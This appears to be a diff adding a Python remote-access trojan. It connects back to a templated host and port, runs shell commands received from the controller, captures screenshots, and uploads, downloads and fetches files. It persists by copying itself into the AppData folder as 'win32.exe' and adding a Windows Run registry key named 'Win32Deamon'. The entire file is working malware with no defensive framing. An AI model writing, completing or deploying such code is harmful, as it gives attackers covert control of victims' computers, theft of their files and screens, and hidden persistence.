@@ -1,0 +1,184 @@
+import socket
+import subprocess
+import requests
+import os
+import json
+import base64
+import shutil
+import sys
+import tempfile
+from mss import mss
+from time import sleep
+
+HOST, PORT = str('{HOST}'), int({PORT})
+
+def json_send(data, s):
+        
+        json_dump = json.dumps(data.decode())
+        s.send(json_dump.encode())
+    
+def json_recv(s):
+
+    data = ''
+    
+    while True:
+        
+        try:
+            
+            data = data + s.recv(1024).decode()
+            data = json.loads(data.encode())
+            return data.encode()
+        
+        except ValueError:
+            
+            continue
+        
+def screen_grab(s):
+    
+    with tempfile.TemporaryDirectory() as tmpdir:
+
+        with mss() as sct:
+
+            screenshot = sct.shot(mon=-1, output=os.path.join(tmpdir, 'screen_grab.png'))
+
+        with open(screenshot, 'rb') as f:
+
+            screenshot_b = f.read()
+
+        json_send(base64.b64encode(screenshot_b), s)
+                    
+def get(url ,s):
+    
+    r = requests.get(url)
+    url = url.decode()
+    FileName = url.split('/')[-1]
+    
+    with open(FileName, 'wb') as f:
+        
+        f.write(r.content)
+        
+    ret_str = '\n[INFO] Succesfully downloaded ' + FileName + '\n'
+    json_send(ret_str.encode(), s)
+    
+def change_directory(command):
+    
+    command = command.decode()
+    
+    try:
+        
+        os.chdir(command[3:])
+        
+    except FileNotFoundError:
+        
+        return '\n[ERROR] Directory doesnt exist\n'.encode()
+    
+    return_msg = '\nCurrent Dir : ' + os.getcwd() + '\n'
+    return return_msg.encode()
+
+def connect():
+    
+    s = socket.socket()
+    # s.settimeout(15)
+    s.connect((HOST, PORT))
+    return s
+
+def shell(s):
+            
+    while True:
+        
+        command = json_recv(s)
+        
+        if(command[:4].decode() == 'KILL'):
+            
+            s.close()
+            raise SystemExit
+        
+        elif(command.decode() == 'clearstr'):
+            
+            json_send('~'.encode(), s)
+
+        elif(command[:2].decode() == 'cd'):
+            
+            json_send(change_directory(command), s)
+            
+        elif(command[:3].decode() == 'get'):
+            
+            get(command[4:], s)
+            
+        elif(command[:10].decode() == 'screengrab'):
+            
+            screen_grab(s)
+            
+        elif(command[:5].decode() == 'start'):
+            
+            try:
+                
+                subprocess.Popen(command[6:].decode())
+                ret_str = 'Succesfully started ' + command[6:].decode()
+                json_send(ret_str.encode(), s)
+                
+            except Exception as e:
+                
+                ret_str = '\n[ERROR] The following exceptions eccured while starting ' + command[6:].decode() + e + '\n'
+                
+                json_send(ret_str.encode(), s)
+            
+        elif(command[:8].decode() == 'download'):
+            
+            try:
+            
+                with open(command[9:], 'rb') as f:
+
+                    content = f.read()
+                    base64_data = base64.b64encode(content)
+                    json_send(base64_data, s)
+                
+            except FileNotFoundError:
+                
+                json_send('\n[ERROR] File doesnt exist\n'.encode(), s)
+                
+        elif(command[:6].decode() == 'upload'):
+            
+            with open(command[7:], 'wb') as f:
+                
+                content = json_recv(s)
+                base64_encode_data = base64.b64decode(content)
+                f.write(base64_encode_data)
+
+        else:
+                        
+            proc = subprocess.Popen(command.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+
+            try:
+
+                result = proc.stdout.read().decode() + proc.stderr.read().decode()
+                json_send(result.encode(), s)
+                
+            except UnicodeDecodeError:
+                
+                json_send('\nError Decoding stdout and stderr from subprocess output\n'.encode(), s)
+
+def main():
+    
+    tgt_location = os.path.join(os.environ['appdata'], 'win32.exe')
+    
+    if not os.path.isfile(tgt_location):
+        
+        shutil.copyfile(sys.executable, tgt_location)
+        subprocess.call('REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v Win32Deamon /t REG_SZ /d "' + tgt_location + '"', shell=True)
+    
+    while True:
+        
+        try:
+            
+            shell(connect())
+        
+        except ConnectionRefusedError:
+            
+            continue
+        
+        sleep(5)
+
+if __name__ == '__main__':
+    
+    main()
